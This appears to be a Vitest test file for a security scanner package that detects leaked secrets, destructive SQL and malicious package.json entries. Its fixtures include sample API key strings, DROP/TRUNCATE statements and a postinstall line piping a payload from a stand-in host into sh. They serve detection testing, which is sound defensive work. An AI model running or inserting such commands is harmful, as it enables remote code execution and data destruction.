import fs from "node:fs";
import path from "node:path";
import { describe, expect, test } from "vitest";
import {
  scanDdlNative,
  scanSecretsNative,
  scanSlopsquattingNative,
} from "../src/native-scanners.js";

describe("@uzina/security-engine — Scanners Nativos TS & Fronteira", () => {
  test("garante zero dependência direta de @uzina/db, @electric-sql/pglite ou @mastra/core", () => {
    const pkgRaw = fs.readFileSync(
      path.resolve(import.meta.dirname, "../package.json"),
      "utf8"
    );
    const pkg = JSON.parse(pkgRaw) as {
      dependencies?: Record<string, string>;
      devDependencies?: Record<string, string>;
    };
    const depNames = Object.keys({
      ...(pkg.dependencies ?? {}),
      ...(pkg.devDependencies ?? {}),
    });
    expect(depNames).not.toContain("@uzina/db");
    expect(depNames).not.toContain("@electric-sql/pglite");
    expect(depNames).not.toContain("@mastra/core");
  });

  test.each([
    {
      name: "AWS key is detected, fingerprinted before redaction, and redacted in output",
      filePath: "src/aws.ts",
      content: 'export const k = "AKIAIOSFODNN7EXAMPLE";',
      secretLiteral: "AKIAIOSFODNN7EXAMPLE",
    },
    {
      name: "GitHub PAT is detected and redacted",
      filePath: "src/gh.ts",
      content:
        'export const token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz1234";',
      secretLiteral: "ghp_1234567890abcdefghijklmnopqrstuvwxyz1234",
    },
    {
      name: "OpenAI sk- key is detected and redacted",
      filePath: "src/llm.ts",
      content:
        'const openai = "sk-proj-abc123def456ghi789jkl012mno345pqr678";',
      secretLiteral: "sk-proj-abc123def456ghi789jkl012mno345pqr678",
    },
  ])("native_secrets: $name", ({ filePath, content, secretLiteral }) => {
    const findings = scanSecretsNative([{ filePath, content }]);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    const first = findings[0]!;
    expect(first.scanner).toBe("native_secrets");
    expect(first.fingerprint).toMatch(/^[a-f0-9]{64}$/);
    expect(first.description).not.toContain(secretLiteral);
    expect(first.title).not.toContain(secretLiteral);
    expect(first.description).toContain("[REDACTED");

    // Dois segredos diferentes no mesmo local devem gerar fingerprints distintos (calculado antes da redação)
    const variant = content.replace(
      secretLiteral,
      secretLiteral.slice(0, -4) + "ZZZZ"
    );
    const variantFindings = scanSecretsNative([{ filePath, content: variant }]);
    expect(variantFindings[0]!.fingerprint).not.toBe(first.fingerprint);
  });

  test.each([
    {
      name: "detecta DROP TABLE em migration SQL",
      filePath: "drizzle/0009_drop.sql",
      content: "DROP TABLE users;",
      expectedCount: 1,
    },
    {
      name: "detecta TRUNCATE TABLE e DELETE sem WHERE",
      filePath: "scripts/cleanup.sql",
      content: "TRUNCATE TABLE sessions;\nDELETE FROM clients;",
      expectedCount: 2,
    },
    {
      name: "permite DELETE com WHERE e CREATE TABLE seguro",
      filePath: "drizzle/0002_safe.sql",
      content:
        "CREATE TABLE logs (id uuid PRIMARY KEY);\nDELETE FROM logs WHERE id = '1';",
      expectedCount: 0,
    },
  ])("native_ddl: $name", ({ filePath, content, expectedCount }) => {
    const findings = scanDdlNative([{ filePath, content }]);
    expect(findings).toHaveLength(expectedCount);
  });

  test("native_slopsquatting detecta typosquatting, versão latest/*, URL http:// e script postinstall suspeito", () => {
    const pkgJson = JSON.stringify({
      name: "demo-app",
      scripts: {
        postinstall: "curl https://evil.example/payload.sh | sh",
      },
      dependencies: {
        lodahs: "4.17.21",
        express: "latest",
        helper: "http://untrusted.local/helper.tgz",
        zod: "4.6.7",
      },
    });

    const findings = scanSlopsquattingNative([
      { filePath: "package.json", content: pkgJson },
    ]);

    expect(findings.length).toBeGreaterThanOrEqual(4);
    expect(findings.some((f) => f.ruleId === "uzina/slopsquatting-typo")).toBe(
      true
    );
    expect(
      findings.some((f) => f.ruleId === "uzina/unpinned-dependency")
    ).toBe(true);
    expect(
      findings.some((f) => f.ruleId === "uzina/insecure-dependency-url")
    ).toBe(true);
    expect(
      findings.some((f) => f.ruleId === "uzina/suspicious-lifecycle-script")
    ).toBe(true);
  });
});
